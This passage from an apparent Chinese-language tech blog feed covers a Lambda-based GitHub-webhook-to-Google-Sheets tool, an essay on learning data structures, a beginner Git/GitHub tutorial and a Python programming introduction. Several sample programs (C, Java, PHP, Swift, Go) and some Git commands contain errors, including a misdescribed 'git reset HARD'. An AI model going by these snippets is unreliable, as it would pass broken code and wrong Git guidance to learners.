3. 要串接 GitHub Webhook，同步把紀錄寫到試算表裡面這個任務我們一樣用 Lambda 搭配其他 AWS 的服務就可以輕鬆實作出來，流程是這樣的：

學生留言，觸發 GitHub Webhook
GitHub Webhook 打到 AWS API Gateway
經由 API Gateway 觸發 Labmda function
Lambda function 透過 Google Sheet API 寫入試算表

我們先來把要丟給 webhook 的 API 給準備好，這邊利用 API Gateway 來觸發 Lambda，像是這樣：

API Gateway 設定上也超級方便，你就設定要用什麼 HTTP method，他就會給你一個網址，假設我設定的是 GET，那你用 GET 打這個 API 它就會觸發 Lambda，用超短的時間就能做出一個 Webhook，比起自己架 Server 還要設定 domain 跟 https 方便得多。
再來就是要串接 Google Sheet API 了，我稍微看了一下官方的 API 發現還是維持一慣的風格，就是文件很完整但是講得很複雜，沒辦法一眼就看出我到底要怎麼實作出我要的功能，後來就找了一套別人包裝過的：Simple Google Spreadsheet Access (node.js)，用起來簡單很多。
最麻煩的權限管理裡面也有教你怎麼實作，基本上就是去開一個Service Account，設定成對 Google Drive API 有權限，然後再去產生這個帳號的 token，用那一組 token 就行了。
主程式要做的基本上就是先過濾資料，接著從 GitHub 丟過來的資料裡找到帳號，把帳號跟日期丟進我另外寫好的 function，最後回傳結果就結束了：
var updateSheet = require(&#x27;./lib&#x27;)  exports.handler = async (event, context, callback) =&gt; &#123;    if (!event.body) return &#x27;no body&#x27;    const body = JSON.parse(event.body) || &#123;&#125;    if (!body || body.action !== &#x27;created&#x27;) return response(callback)    const title = body.issue.title.split(&#x27; &#x27;)    if (!title.length) return response(callback)    const date = title[1]    const account = body.comment.user.login    console.log(&#x27;log:&#x27;, date, account)    try &#123;        await updateSheet(date, account)        return callback(null, &#123;            statusCode: 200,            body: date + account        &#125;)    &#125; catch (err) &#123;        console.log(&#x27;error:&#x27;, err)    &#125;          return response(callback)&#125;;  const response = (cb) =&gt; &#123;    cb(null, &#123;        statusCode: 200,        body: &#x27;ok&#x27;    &#125;)&#125;

updateSheet 這個 function 做的事也很簡單，就是根據日期還有帳號找到正確的位置，把那一格的值更改成 O 就好了，這邊附上部分程式碼供大家參考：
async function searchAccount(sheet, account) &#123;  const firstRow = await getCells(sheet, &#123;    &#x27;min-row&#x27;: 1,    &#x27;max-row&#x27;: 1  &#125;)  const length = firstRow.length  for(var i=0; i&lt;length; i++) &#123;    if (firstRow[i].value === account) &#123;      return &#123;        col: firstRow[i].col,        batchId: firstRow[i].batchId      &#125;    &#125;  &#125;  return null&#125;  async function setValue(sheet, row, col, value) &#123;  const cells = await getCells(sheet, &#123;    &#x27;min-row&#x27;: row,    &#x27;max-row&#x27;: row,    &#x27;min-col&#x27;: col,    &#x27;max-col&#x27;: col,    &#x27;return-empty&#x27;: true  &#125;)  if (cells &amp;&amp; cells[0]) &#123;    cells[0].value = value    cells[0].save(function(err) &#123;      if (err) &#123;        console.log(&#x27;err&#x27;, err)      &#125;    &#125;)  &#125;&#125;  async function updateSheet(date, account) &#123;  try &#123;    const sheet = await getSheet()    const accountPosition = await searchAccount(sheet, account)    const datePosition = await searchDate(sheet, date)    console.log(&#x27;position:&#x27;, accountPosition, datePosition)    if (!accountPosition || !datePosition) return    await setValue(sheet, datePosition.row, accountPosition.col, &#x27;O&#x27;)  &#125; catch (err) &#123;    console.log(&#x27;err&#x27;, err)  &#125;  &#125;

最後只要在 GitHub 那邊把 webhook 的網址設定好，一切就大功告成了！
在 Lambda 上要如何 debug？雖然我上面寫的輕鬆寫意，但實際開發的時候我其實有碰到幾個小問題，第一個就是 debug 不像你在電腦上那樣可以直接看到結果，而且 webhook 通常又是比較難 debug 的一個。
有關於這部分，其實 Lambda 都會把 log 送到 CloudWatch 去，所以就是自己在 app 裡面寫 log，再去看 CloudWatch 分析一下那些 log，如果是簡單的應用的話還滿容易的，再複雜一點的話應該就是 function 要切更細，不然 debug 起來應該滿麻煩的。
另一個碰到的問題是 Google Sheet API 那邊速度比較慢，整個過程做完大概要 5 秒左右，預設的 timeout 好像是 3 秒左右，記得要自己把 timeout 加大不然會一直失敗。
總結這次對於 AWS Lambda 的使用體驗滿不錯的，開發過程中沒碰到什麼太大的困難，可能跟我想實作的東西比較簡單也有關係，但這種簡單的東西我覺得超級適合走這種 Serverless 的方案，因為沒有 Server 真的超方便的，少了很多麻煩。
以後如果還有類似簡單的小需求，我想我應該還是會走這種解決方案，直接用現成服務一個串一個，把東西全部串起來就結束了。也推薦大家如果要做一些小東西，不妨來試試看用這些現成的服務搞定，可以節省很多時間。
關於作者：@huli 野生工程師，相信分享與交流能讓世界變得更美好
]]></content>
      <tags>
        <tag>lambda</tag>
        <tag>aws</tag>
      </tags>
  </entry>
  <entry>
    <title>如何充滿熱情地學習 - 以資料結構為例</title>
    <url>/2018/09/02/learn-with-passion/</url>
    <content><![CDATA[前言最近不管是工作、還是自己額外的學習，都感受到擁有熱情是很重要的，有熱情，才更想投入心力，把技能磨練到頂尖，也在過程中獲得更多樂趣！
最近大家都喊著要學程式設計，因為有超級爆炸多的未來應用，例如虛擬實境、擴增實境、人工智慧、機器人、區塊鍊等等東西都需要大量的程式設計師。
但是，要把程式寫好，良好的資料結構與演算法基礎是不可少，網路上也已經有好多好多的學習資源了。可是，在透過這些資源學習的時候，常常感受到的都是「題目好難」、「好多東西要學」…等等，所以今天想要花一些時間來探討探討，到底該怎麼做，才能有熱情地來學習，並用資料結構來舉例。
了解意義價值，知道自己的學習具有意義首先，我來講一個前提，這個前提就是：
如果我們認真地去觀察每一件事情，幾乎都可以看到這件事情存在或發生的意義。

我們來看資料結構，就可以看到這些資料結構都被運用在很多地方。
例如，大家最一開始學到的 Array，可以用來儲存同類型的東西、你不需要為 array 中每一個元素都重新宣告一個變數，光是 array 存在的本身就省下大家寫 code 大量的時間。
再來，最近很夯的 Deep Learning，裡面有大量的類神經網路權重，這些權重也都是用矩陣（實際上就只是更多維度的 array）來儲存。
甚至，你要儲存一個更複雜的資料結構 - graph，你也可以用 2D array 來儲存 node 之間的關係。
每天生活中我們會看到的影像，在操作時也不過就是存有一堆數值的 2D array。
這麼一個看起來很簡單、很 trivial 的資料結構，如果你稍微想一想，就會感受到你的生活中有許多東西，背後可能都使用到 array，或跟 array 有異曲同工之妙（例如你的書架就像是 array，上面的書就像是裡面的元素）。
這些資料結構都是很有意義的，他們並不只是冷冰冰的知識，而是有實際用途才被發明出來的東西，而當我們了解他們的用途，就慢慢可以了解為何我們需要學習各種資料結構的各種操作的時間複雜度，因為這些知識可以幫助你將這些好東西用到極致！
可是，雖然我們可能可以感受到學的東西有意義，但學習過程中卻會遇到挫折，所以接下來想要跟大家分享快樂學習的一個方法~
善用你的腦袋，讓學習更快樂最近因緣際會，學習到關於我們大腦的一些知識，這些知識對於保有學習熱忱也有很大的幫助，也會讓你在面對挫折時更容易跳脫出來。
從 大腦愈開心，學得愈好！高效學習 6 個祕密 ，可以看到一個重要的資訊：
帶來快樂感覺的神經傳導物質多巴胺，是提升學習效能的要角之一。當達成目標時，多巴胺會大量分泌令人欣喜莫名，同時也讓達成目標那個行為的神經迴路連結得更緊。 研究證實多巴胺會刺激大腦可塑性改變：行為開始→經過嘗試錯誤終於成功→得到成就感和報酬→多巴胺釋放快感湧出→固化達成該行為的神經迴路→增強嘗試的動機→再次做該行為。 善用這個學習的良性循環，不分年齡、性格或際遇，誰都可以強化學習，重塑大腦。

也就是說，當我們開始學習新東西的時候，其實是建立這類新東西的神經迴路。所以，遇到挫折時根本不用太擔心！因為，你只是還在建立相關的迴路而已！
你對這個領域的每一次思考、每一次學習，都是在打通相關的神經迴路，換言之，你就是你自己腦袋的架構師。你所做的事會影響你腦袋的架構，而這個架構能夠回過頭來幫助你做到你想做的事。
舉例來說，當很多人剛學到紅黑樹這類進階的資料結構時，就算你知道學習紅黑樹很有意義（紅黑樹的應用可見 此篇文章，心中可能還是會感到恐懼，因為覺得好像很難懂，各種操作怎麼那麼複雜。
可是，如果你把心思放在你對自己腦袋做的每一次迴路重建，那你能感受到成就感所需要的門檻就大大降低了！
說更清楚一點，請你試著想像，今天看到下面這一點點介紹：

一般人的想法大概就是：「恩，這定義滿簡單的，我會了，我要繼續往下看。」
可是，如果你了解你自己光看完這些定義，就已經強化了自己腦袋中跟紅黑樹相關的迴路，那你這時會感受到的可能是：「喔？居然會想到可以把樹漆成紅色跟黑色的，好奇怪，但這麼奇怪的東西居然會是我們常用的 map（C++ STL）背後的實作機制，真有趣。是說，光是看到這定義，我腦袋中關於紅黑樹的迴路就已經加強了，繼續看看吧。」
當想法有了轉變，就讓你學習的過程開始轉變，不再只是快速地看過簡單的地方，然後遇到難的地方就卡住，就不想學習。而是可以把握每一個小小的點，了解這些都只是強化你腦袋迴路的過程。當你持續這麼做，你累積的每一個小小的點就會讓你產生一些 Aha moment，體會到原本不懂的東西、迸發原本沒聯想過的創意，再次釋放多巴胺，強化你的迴路！
形成正循環掌握了所學事物的意義價值、能夠善用學到新知和突破的成就感，接下來就是讓這個循環成形，既感受到意義，又能藉由學習的快樂和實際將知識拿來運用、驗證學這些東西的意義。最後就能形成一個正向的循環，讓過程越來越快樂。
總結這次跟大家分享了一些可以幫助快樂學習的方法，這些方法對我來說是滿有幫助的，也希望可以幫助大家學習得更愉快！
延伸閱讀
模擬大腦學習過程，DeepMind 用強化學習神經網路找出人類內化過去經驗解決新任務的關鍵

頂尖AI實驗室建立經驗分享：孫民這段影片講到怎麼讓學生的動機去成為一個好的研究者。

What are the applications of data structures?


關於作者：@pojenlai 演算法工程師，對機器人、電腦視覺和人工智慧有少許研究，正在學習用心體會事物的本質跟不斷進入學生心態改進。
]]></content>
      <tags>
        <tag>Data Structure</tag>
        <tag>learning</tag>
        <tag>passion</tag>
      </tags>
  </entry>
  <entry>
    <title>Git 與 Github 版本控制基本指令與操作入門教學</title>
    <url>/2018/01/17/learning-programming-and-coding-with-python-git-and-github-tutorial/</url>
    <content><![CDATA[
前言要成為一個真正的軟體工程師（Software Engineer）除了掌握基礎開發能力外，更重要的是和其他工程師和開發者團隊合作和溝通的能力，所以若你能培養出掌握 Git 等版本控制操作和 Git server 架設的能力，你會更容易參與開放原始碼（open source）的社群和提昇自己在職場上的價值。好，那我們就準備開始吧！
什麼是版本控制系統（Version Control System）？
版本控制系統是一種軟體工程的開發技巧，可以透過這個系統讓每位成員的軟體版本可以方便同步和維護管理（不然要用 email 或是其他工具傳送和管理十分麻煩，尤其程式又常常會有不同版本修改的問題！）。在沒有版本控制系統時，我們常會在編輯檔案前複製一個備份，或是在更新檔案後產生許多重複檔案，非常不便且難以維護。因此，使用版本控制系統的需求就應運而生啦！

一般在軟體開發中又分為中央式系統（例如：Subversion、CVS 等）與分散式系統（例如：Git、BitKeeper、mercurial 等），中央式版本控制系統的工作主要在一個伺服器進行，由中央管理存取權限「鎖上」檔案庫中的檔案，一次只能讓一個開發者進行工作。而分散式系統讓不同開發者直接在各自的本地檔案庫工作，並容許多個開發者同時更動同一個檔案，而每個檔案庫有另外一個合併各個改變的功能。分散式系統讓開發者能在沒有網路的情況下也能繼續工作，也讓開發者有充分的版本控制能力，而不需經中央管理者的許可，但分散式系統仍然可以有檔案上鎖功能。

什麼是 Git？什麼是 Github？Git 是一個分散式版本控制軟體，最初由 Linus Torvalds 創作（也是作業系統 Linux 系統的開發者），其最初目的是為更好地管理 Linux kernel 開發而設計，其具備優秀的 merge tracing 合併程式碼的能力（使用程式碼 snapshot 來比較歷史版本差異）。
Github 則是一個支援 git 程式碼存取和遠端托管的平台服務，有許多的開放原始碼的專案都是使用 Github 進行程式碼的管理。若是讀者未來有志於從事程式設計相關工作的話，建議可以熟悉掌握 Git 和 Github 的使用，並建立自己的 Github profile 作品集。
Git 基本觀念
Git 可以分為 Local（本地）和 Remote（遠端）兩個環境，由於 Git 屬於分散式的版本控制系統，所以開發者可以在離線 local 環境下開發，等到有網路時再將自己的程式推到 Remote 環境或 pull 下其他開發者程式碼進行整合。在 Local 中我們又分為 working directory（工作資料夾）、staging area（暫存區）和 repositories（檔案庫）。
當自己開發時會在工作資料夾工作，當要進入檔案庫之前會先將檔案加入暫存區，確認沒問題則 commit 到檔案庫中，最後 push 上去 remote 環境。在 Git 中若是有和其他開發者一起合作，則會需要處理不同 branch 之間 conflict 和 merge 的問題。

Git 與 Github 實戰操作入門教學接下來我們用一個實際的實戰範例讓讀者可以快速的掌握那些基礎必知必會的 Git&#x2F;Github 操作技能：

安裝並且設定 Git
 任務 1：安裝 Git 到你的電腦上，並且設定好 Git 內部的使用者名稱和電子信箱
 Linux 若是使用 Debian 基礎的作業系統可以在終端機輸入以下指令安裝 git：
 $ apt-get install git

 若是 Fedora 系列可以輸入：
 $ yum install git-core

 若是 windows 可以下載安裝 cmder 這個模擬 Linux terminal 終端機時選擇完整版本就會順便安裝或是到 Git 官網安裝。當然在市面上有許多免費 GUI 圖形化的 Git 操作軟體，若是初學者則建議先熟悉整個 git 工作模式和指令，再去使用圖形化工具會比較好，這樣你才比較知道圖形化程式背後做了什麼事情。Mac 則是可以到 Git 官方網站 選擇對應作業系統，按照步驟完整下載安裝。另外也可以參考中文安裝教學。
 由於我們會選擇 Github 當作遠端托管程式的環境，所以我們也可以根據作業系統安裝 Github 桌面版當作操作工具（內建安裝 Git）。
 
 若是安裝完成，打開終端機（terminal）或 cmder 輸入以下指令，若成功顯示版本（建議 Git 版本在 2 以上），代表安裝成功囉！terminal（終端機）是一個可以下指令讓電腦做事情的互動介面（例如：新增檔案、移動到資料夾等）
 // 其中 $ 為提示字元，在輸入指令時不用輸入該符號，否則會錯誤，若是使用 windows cmder 預設是 λ$ git --version

 接下來設定你的帳戶，讓 Git 知道這台電腦做的修改要連結到哪一個使用者（待會我們要在 Github 上註冊帳號，建議使用一致的帳號和電子信箱）：
 $ git config --global user.name &quot;&lt;Your Name&gt;&quot;

 設定電子郵件：
 $ git config --global user.email &quot;&lt;your@gmail.com&gt;&quot;

建立一個本機的 repository
 任務二：在自己的電腦上建立一個新的 local repositories（本地檔案庫）
 
 repository（檔案庫）是一個什麼樣的概念呢？事實上 repository 就是一個專案，又簡稱 repo。以電腦的檔案資料管理來看，我們通常會把同一個專案的資料放到同一個資料夾下，所以我們也可以把 repository 看成一個資料夾。
 // 建立一個 hello-git 資料夾$ mkdir hello-git// 移動到 hello-git 資料夾$ cd hello-git// 將專案資料夾建立成 git repository$ git init// 列出專案資料夾下的檔案和資料夾（-l 參數為列出詳細資料，-a 為列出隱藏資料夾）$ ls -la 

 當你執行 git init 後，你可以發現多出了 .git 這個隱藏資料夾，可以看到裡面檔案和資料夾如下：
 
 到這邊恭喜讀者，完成你第一個 git 專案資料夾改造計畫！

檢視狀態、新增或修改 commits
 任務三：在你的 repository 檔案庫中建立一個新檔案，新增一些內容到該檔案並且將那些檔案修改提交 commit 到 Git 中
 接著我們使用文字編輯器，新增一個 hello.py 的檔案（裡面是一個會印出 hello python &amp; git 字串的 python 程式）：
 hello.pyprint(&#x27;hello python &amp; git&#x27;)

 然後在終端機的專案資料夾下輸入 git status 顯示目前工作環境狀態：
 $ git statusOn branch masterInitial commitUntracked files:(use &quot;git add &lt;file&gt;...&quot; to include in what will be committed)    hello.pynothing added to commit but untracked files present (use &quot;git add&quot; to track)

 我們會發現因為我們有新增新的檔案，但是還沒進到 git 追蹤範圍中&#x2F;暫存區，所以我們要使用 git add hello.py 加入追蹤，這樣之後檔案有修改就可以追蹤到。
 $ git add hello.py$ git statusOn branch masterInitial commitChanges to be committed:(use &quot;git rm --cached &lt;file&gt;...&quot; to unstage)    new file:   hello.py

 若是確認沒問題我們就準備 commit 進去 repository 囉！
 // 比較現在檔案和上次 commit 之間的差異，也就是說你做了哪些修改$ git diff// -m 為輸入 commit message，也就是說這個 commit 內做了哪些事情$ git commit -m &quot;Init hello.py&quot;[master (root-commit) ad6d328] Init hello.py1 file changed, 1 insertion(+)create mode 100644 hello.py// commmit 完成$ git statusOn branch masternothing to commit, working tree clean

 若是想反悔不想把檔案加入追蹤呢？
 // 檔案尚未加入過追蹤時使用，即可恢復到檔案尚未加入暫存區$ git rm --cached hello.py// 若檔案已經在 repository 內，則使用以下指令// repository 與 stage 的檔案都會被還原到 HEAD，但 working directory 內的檔案不變$ git reset HARD

 當你追蹤後修改了檔案，例如把 hello.py 的內容改成：
 hello.pyprint(&#x27;hello python &amp; git rock&#x27;)

 若有檔案修改，記得要再 add 修改的檔案（這是新手比較容易忘記的部分），若是要放棄修改可以使用 git checkout -- 檔案名稱
 // 比較現在檔案和上次 commit 之間的差異，也就是說你做了哪些修改$ git diff// 查看目前工作狀態$ git statusChanges not staged for commit:(use &quot;git add &lt;file&gt;...&quot; to update what will be committed)(use &quot;git checkout -- &lt;file&gt;...&quot; to discard changes in working directory)    modified:   hello.py

 commit 這個修改時簡寫會寫成這樣（-a 是 add，-m 為 message 簡寫，後面接訊息資訊）：
 $ git commit -a -m &quot;修改了 hello.py&quot;

註冊 GitHub 帳號
 任務四：建立一個 GitHub 帳號，並在 Git 設定中加入使用者帳號
 到目前為主我們程式主要是在我們 local 工作環境中操作，但還記得我們在 Git 基本觀念中有提到，git 分為 local 和 remote，若是我們想要和全世界其他開發者合作或是貢獻開放原始碼的話，我們可以透過 github 來當作我們 remote 工作環境，去管理我們程式碼，同樣的也可以透過 github 平台和其他開發者一起合作，參與開放原始碼的開發。github 若是公開的 repo 是無限制數量免費的，但是若是想使用 private repo 可以參考付費方案。
 // 注意大小寫要一致$ git config --global user.username &lt;你的 github 使用者名稱&gt;

 先到 github.com 註冊帳號：
 
 
 點選右上角 + 來新增 new repository（檔案庫）：
 
 輸入 repository name（你要取的專案名稱），最好跟電腦 local 專案一致，我們這邊輸入 git-example。然後輸入簡短專案描述並先不勾選初始化 README 和，也先不要選擇 .gitignore 和 License 授權（不然會造成本地端和遠端不一致會需要額外一些處理）：
 .gitignore：要忽略的檔案清單，這是用來告訴 Git，當在做版本控制記錄的時候，忽略這些檔案。通常一些機密資料，如資料庫帳號密碼或是 server IP 位置等，記得要加入。也可以參考 github 上面的一些範本 在新增 repository 時選取對應的程式語言
 README.md：repository 介紹和使用方式說明（例如：使用方法、參與專案方式等），使用 markdown 語法撰寫。另外通常有 CONTRIBUTING.md 額外說明如何參與貢獻。
 LICENSE：專案使用何種授權方式，例如：MIT、BSD 等
 
 接著按 create 按鈕！恭喜你新增成功，創建了自己第一個 github repository（遠端檔案庫）！

將 repository 做本機和遠端的連結
 任務五：把電腦裡 Local（本地端）的 repository（檔案庫）和 remote（遠端）的 repository（檔案庫）連結起來，並 push 電腦上的修改
 
 因我們已經在專案有把 hello.py 修改加入追蹤並 commit 到 local 檔案庫，所以我們可以參考下方的指令說明把 remote 網址加入：
 // 本地端專案知道 origin 對應到遠端網址$ git remote add origin &lt;remote 網址&gt;

 接者準備將本地端程式 push 到遠端檔案庫：
 // 觀看情況$ git status// 將本地端程式 push 到遠端檔案庫$ git push -u origin masterCounting objects: 3, done.Writing objects: 100% (3/3), 239 bytes | 0 bytes/s, done.Total 3 (delta 0), reused 0 (delta 0)To https://github.com/happycodergit/git-example.git* [new branch]      master -&gt; masterBranch master set up to track remote branch master from origin.

 參數 -u 等同於 --set-upstream，設定 upstream 可以使分支開始追蹤指定的遠端分支。事實上，只要做過一次 $ git push -u &lt;remote name&gt; &lt;branch name&gt;，並且成功 push 出去；本機端的 master 就會被設定去追蹤遠端的 &lt;remote name&gt;/&lt;branch name&gt; 分支。只要成功設定好 upstream 後，第二次以後要上傳分支時，就只需要透過 git push 就可以了，不必再帶 &lt;remote name&gt; 跟 &lt;branch name&gt; 等參數。例如：$ git push。
 事實上，$ git push -u origin master 可以拆解成：
 $ git push origin master$ git checkout master$ git branch -u origin/master

 恭喜你成功把你的專案推送上去 github 啦！
 

Fork 和 clone 一個 open source（開源）的計畫
 任務六：從 GitHub.com 建立專案，複本 fork，並下載 clone 到電腦上
 點選左上角 github icon 回到首頁，我們從上面搜尋欄搜尋 react：
 
 點選右上角 fork 按鈕，複製一份專案到我們這：
 
 等待 fork 中：
 
 點選右邊綠色按鈕 clone download 複製 HTTP 網址：
 
 // 複製到本地端$ git clone https://github.com/happycodergit/react.git// 移動到 react 資料夾$ cd react// 切出自己的新分支（使用 -b）$ git checkout -b happycoder@feature_branch// 做一些 README.md 檔案修改，然後 commit 到自己 fork 過來的專案$ git commit -a -m &quot;Update README&quot;$ git push origin happycoder@feature_branch

 事實上，每個開放原始碼都有他自己貢獻的方式，記得要先了解。例如可以參考 react 貢獻說明！
 
 你可以透過將自己的修改 commit 到自己 fork 過來的專案，然後到原始專案頁面點選 new pull request 按鈕發 pull request（會比對程式碼的差異）。若對方 review 完後接受就可以將自己的程式碼合併到原始專案中，為開放原始碼做出第一步貢獻！
 // 若完成 pull request 記得讓 master（或是合併進去的 branch）保持同步$ git pull upstream master

練習建立一個 feature branch
 任務七：回來原來的 git-example 專案新增 feature branch（分支）
 // 建立一個名為 dev 的 branch$ git checkout -b dev

 在 hello.py 最上面多加一行 # hi, this is comment 註解後存檔
 // commit 到本地端更新$ git commit -a -m &quot;Init dev branch&quot;$ gut push origin dev

邀請別人和你合作
 任務八：在專案新增夥伴 collaborator
 在右上角進入 setting 可以選擇到 collaborator 新增合作者：
 

利用 push 和 pull 來和 GitHub.com 同步
 任務九：用 pull 來和其他 collaborators（合作者）同步更新，確保程式是最新的版本
 請其他開發者 git colone 下來你的 git-example 專案並 checkout 到 dev branch，並完成新增一個 README.md 檔案後發 pull request 過來，若沒問題就按同意並合併。我們則透過 git pull 來保持本地端和遠端程式碼同步：
 $ git pull origin dev

Merge（合併）和刪除 branches
任務十：在本機上 merge 合併你的 branch（分支），刪除舊的 branch（分支）
// 移動到 master branch$ git checout master// 合併 dev 到 master$ git merge dev// 刪除 dev branch$ git branch -d dev// 將合併後的 master 推送到遠端$ git push origin master

總結以上就是 Git 與 Github 版本控制基本指令與操作入門教學！希望讀者可以動手一起操作，漸漸就能感受到 git 的威力和好處，同時也有能力參與開放原始碼（open source）的社群和提昇自己在職場上的價值，朝成為一個真正的軟體工程師（Software Engineer）邁進！
參考文件
30 天精通 Git 版本控管
Git 官方網站
Try Git
Git-it
GitHub Guides
如何將檔案從stage移除?
Git 教學

（image via git-scm、qbox、quoracdn、ytimg、linux、imgur、martinfitzpatrick）
關於作者：@kdchang 文藝型開發者，夢想是做出人們想用的產品和辦一所心目中理想的學校。A Starter &amp; Maker. JavaScript, Python &amp; Arduino&#x2F;Android lover.:) 
]]></content>
      <tags>
        <tag>github</tag>
        <tag>軟體工程師</tag>
        <tag>軟體工程</tag>
        <tag>software engineering</tag>
        <tag>bash</tag>
        <tag>shell</tag>
        <tag>svn</tag>
        <tag>version control</tag>
        <tag>VCS</tag>
        <tag>git</tag>
        <tag>cvs</tag>
        <tag>自學程式心得</tag>
      </tags>
  </entry>
  <entry>
    <title>用 Python 自學程式設計：程式設計思維入門</title>
    <url>/2017/10/05/learning-programming-and-coding-with-python-introduction/</url>
    <content><![CDATA[ 
什麼是程式設計思維？最近幾年全球刮起了一股爭相學習電腦科學（Computer Science）和程式設計（Programming）的風氣，上至總統、首相下至升斗小民都爭相開始學寫程式。事實上，學寫程式最重要的是學習電腦科學背後思考方式和邏輯，學習如何透過科技解決生活上的問題。更進一步說，程式設計與其說是一種科學，更偏向一種藝術人文的創作與科學的混合體。以前畫家或是作家是拿紙筆創作，現在只要有一部電腦，連上網路，就可以透過敲打鍵盤將自己的創意付諸實踐。
有人說：程式設計 = 演算法 + 資料結構
這樣的說法不能說錯，事實上，具備良好資料結構和演算法素養的程式設計師往往可以寫出品質較好的程式碼，但大部分人看到演算法和資料結構就已經滿臉問號了，更別提曾經在學校被這兩門課程心靈受挫的學生們。所以對於初學者來說，更應該讓他了解，事實上學程式設計思維就是在學習解決問題的能力（並非每個人都需要成為程式設計師）：

尋找並發現問題
釐清並定義問題
分解問題
尋找解決方法和資源
驗證問題和解決方式

唯有具備這樣解決問題的能力，才能稱得上真正學會程式設計思維。而這樣的思考方式的訓練是不管將來到哪裡，是否有從事程式設計相關工作都受用，這才是對於學習電腦科學與程式設計思維正確的認知。
寫程式就是下指令請電腦做事情剛剛我們在上面提到程式設計思維中有一個部分是分解問題，事實上，寫程式在定義問題後，我們必須把問題切分，就像是食譜一樣，不管是再豐盛的料理或是滿漢全席，都有一個個步驟去完成。舉例來說，我們今天要創作一道蔥花蛋或菜脯蛋，我的步驟會是：

放點油
打蛋
如果喜歡蔥花可以加入蔥花，如果喜歡菜脯可以加入菜脯（程式術語：if...else 條件判斷）
放入少許鹽巴
中火快炒，翻五次面（程式術語：for 迴圈）
當看到蛋面呈現金黃色時可以起鍋，結束料理（程式術語：while 迴圈）
好吃的蔥花蛋或菜脯蛋上桌

再大程式切分後就變成一個個小程式和指令，將程式切分成一個個模組，再將它們都組裝起來就成我們的應用程式和系統。
第一次學寫程式，學哪一種語言好呢？既然程式設計思維很重要，究竟第一次學寫程式，學哪一種語言好呢？
先講結論：Python 語法平易近人，學習曲線平緩，應用廣，可以很快做出一些解決生活上問題的應用，累積成就感，適合初學者。當然若你是國中小的學生，Scratch 之類的拖拉式圖象化程式語言或許是合適選擇，但成人一般對於這種玩具比較排斥些，認為不是真正在學寫程式。
一般而言除了區分高低階程式語言外，我們會把程式語言分為：
靜態語言：在程式語言中我們會使用變數（variable）儲存程式的值，在靜態語言中需要事先宣告變數型態（type），也宣告了它會在記憶體中佔有多少空間等資訊。電腦會透過這些資訊把程式編譯（compile）成低階的機器語言讓電腦可以執行。這樣的設計可以讓電腦執行起來更有效率，但對於開發者來說會比較繁瑣一些（例如：宣告字串變數要在變數前加 string 宣告），也由於類型被宣告後無法改變，所以被稱為靜態語言。常見的靜態語言包括：C&#x2F;C++、Java、C#、Go、Swift 等）。
動態語言（又稱為 script language）：相對於靜態語言，動態語言不會強制變數類型宣告，它不是使用編譯器而是使用直譯器（interpreter）來解譯。動態語言雖然開發和撰寫程式上效率較快，但執行速度往往比靜態語言慢（現在差距已經慢慢變小）。一般常見的動態語言包括：Python、JavaScript、PHP、Ruby 等）。
以下就來先簡單介紹常見程式語言和它的簡單語法範例（可以透過 repl.it 可以將程式碼貼在網頁上呈現所見即所得效果）：

Python本系列文章的主角，Python 是一種物件導向、直譯式的跨平台動態程式語言，它包含了一組功能完備的標準庫和豐富套件生態系，可以輕鬆完成很多常見的任務（例如：物聯網應用開發、遊戲、讀寫檔案、自然語言處理、網路爬蟲、網站開發、機器學習等），因為它可以很輕易整合其他底層語言，所以又稱為膠水語言。它的語法簡單，與其它大多數程式設計語言使用大括弧不一樣，它使用縮進來定義語句塊。由於具備簡潔易學等特性，是許多開發者推薦 Python 為初學者第一個學習的程式語言。由於版本更迭，我們接下來討論的主要是以 Python3 為主。以下是使用 Python 印出最喜歡的語言：
 language = &#x27;Python&#x27;print(&#x27;My favorite Language is &#123;&#125;&#x27;.format(language))

C 經典的傳統主力程式語言，適用於需要效能重視速度的應用，可以操作許多小細節，但學習門檻稍微高一些，執行前需要事先編譯完成：
 #include &lt;stdio.h&gt;int main(int atgc, char *argv[]) &#123;    string language = &quot;C++&quot;;    printf(&quot;My favorite Language is %s&quot;, language);    return 0;&#125;

C++ 屬於 C 家族成員，具備物件導向特性，同樣是適用於需要效能重視速度和操作底層韌體、硬體的好選擇：
 #include &lt;iostream&gt;using namespace std;int main() &#123;    string language = &quot;C++&quot;;    cout &lt;&lt; &quot;My favorite Language is &quot; &lt;&lt; language;    return(0);&#125;

Java 常見於企業系統和 Android 行動應用開發的 Java 是物件導向程式語言，由於跨平台開發等特性讓 Java 一直是市場蠻熱門的語言。
 public class CodeLanguage &#123;    public static void main(String[] args) &#123;        string language = &quot;Java&quot;;        System.out.format(&quot;My favorite Language is %s&quot;, language);    &#125;&#125;

C# 由微軟推出吸收了 C++&#x2F;Java 等優點的物件導向程式語言，常見於開發微軟平台相關的應用程式。
 using System;namespace CodeLanguage &#123;    class CodeLanguage &#123;        static void Main() &#123;            string language = &quot;C#&quot;;            Console.WriteLine(&quot;My favorite Language is &#123;&#125;&quot;, language);        &#125;    &#125;&#125;

JavaScript 隨著版本演進和 Node.js 的推出後從玩具語言到可以挑大樑的程式語言，應用範圍遍及網頁前後端開發、遊戲開發、物聯網程式開發、手機程式開發等。是程式設計師社群平台 Github 和程式問答平台 StackOverflow 上最受歡迎的程式語言之一。且由於應用範圍廣泛，程式江湖更傳言：可以使用 JavaScript 編寫的程式，最終都會出現 JavaScript 版本。
 var language = &#x27;JavaScript&#x27;console.log(&#x27;My My favorite Language is &#x27; + language);

PHP 吸收了 C&#x2F;Java&#x2F;Perl 特點的網站開發主力語言，世界上有許多的網站都是使用 PHP 進行開發。
 &lt;?php    $language = &#x27;PHP&#x27;;    echo &#x27;My favorite Language is &#x27; + language;?&gt;

Ruby 常見於網頁 Web 開發，以 Ruby on Rails Web 開發框架聞名於程式設計社群。
 language = &#x27;Ruby&#x27;puts &#x27;My favorite Language is #&#123;language&#125;&#x27;

Swift 由 Apple 推出的推出的程式語言，主要用於開發 iOS&#x2F;Mac 系列產品，應用範圍也涉及到了伺服器端開發（Server）。
 let language = &#x27;Swift&#x27;print(&quot;My favorite Language is &quot;, language)

Go由 Google 推出的程式語言，適合用於平行化程式開發。
package mainimport &quot;fmt&quot;func main() &#123;    language := &#x27;Go&#x27;    fmt.Printf(&quot;My favorite Language is %s&quot;, language)&#125;

看完了眾多語言是不是發現其實 Python 語法還蠻可愛平易近人的呢？事實上，世界上沒有最好的程式語言，只有最適合的使用地方。接下來我們將透過 Python 學習程式設計思維。
Python 環境建置在開始之前我們必須先建置相關的開發環境，讓自己從麻瓜（不會寫程式的人）變成擁有程式魔力的魔法師。
